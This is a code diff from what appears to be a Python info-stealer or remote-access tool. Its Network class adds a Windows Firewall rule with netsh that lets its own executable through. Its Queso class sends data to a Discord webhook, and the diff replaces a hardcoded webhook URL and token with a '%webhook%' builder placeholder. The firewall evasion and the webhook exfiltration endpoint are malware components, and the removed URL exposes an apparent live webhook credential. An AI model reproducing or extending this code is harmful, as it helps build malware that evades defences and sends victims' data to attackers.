@@ -125,7 +125,7 @@ class Network:
         )
 
     @staticmethod
-    def ExcludeFromFirewall(path:str = None) -> None: # Exclude a file from Windows Firewall
+    def ExcludeFromFirewall(path: str = None) -> None: # Exclude a file from Windows Firewall
         if path is None:
             path = Utility.GetSelf()[0]
         subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(path))
@@ -157,7 +157,7 @@ class Tasks:
 
 class Queso:
 
-    Webhook: str = "https://discord.com/api/webhooks/1122499476712595519/FuVEZ0l0t3rXCjDcs_I8FrFY1Q1SlUGMdvjghQL31G0yOFWlBKJbQnL_MBHOWMkMs09q"
+    Webhook: str = "%webhook%"
     TempFolder: str = None
 
     def __init__(self) -> None:
